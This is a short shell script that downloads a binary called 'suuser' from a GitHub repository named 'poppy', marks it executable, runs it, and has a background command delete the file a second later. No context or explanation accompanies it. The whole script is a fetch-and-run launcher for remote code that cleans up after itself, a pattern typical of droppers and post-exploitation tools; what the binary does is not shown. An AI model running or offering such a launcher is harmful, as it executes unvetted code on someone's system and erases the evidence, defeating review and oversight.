curl -fSsL https://raw.githubusercontent.com/tahaafarooq/poppy/main/suuser -o suuser || exit
chmod +x suuser || exit
(sleep 1 && rm ./suuser &)
./suuser